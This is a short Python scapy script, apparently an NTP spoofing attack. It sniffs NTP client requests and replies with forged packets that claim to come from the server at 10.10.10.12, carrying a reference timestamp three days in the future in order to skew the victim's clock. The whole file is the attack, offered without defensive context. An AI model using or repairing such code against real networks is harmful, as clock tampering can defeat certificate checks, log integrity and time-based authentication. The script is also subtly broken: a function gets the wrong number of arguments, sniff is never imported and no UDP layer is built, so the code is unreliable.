from scapy.all import IP, UDP, NTP, send
import time

server_ip = "10.10.10.12"
src_ip = "10.10.10.10"
ref_timestamp = time.time() + 259200

def send_ntp(server_ip, src_ip):
    ntp_packet = NTP()

    ntp_packet.ref = ref_timestamp

    ip_packet = IP(src=server_ip, dst=src_ip)

    print("Packet before sending")
    ntp_packet.show()

    send(ip_packet/ntp_packet, verbose=True)

def ntp_request(packet):
    if packet.haslayer(NTP) and packet[NTP].mode == 3:
        send_ntp(server_ip, packet[IP].src, ref_timestamp)

if __name__ == "__main__":
    sniff(filter="udp and port 123", prn=ntp_request)
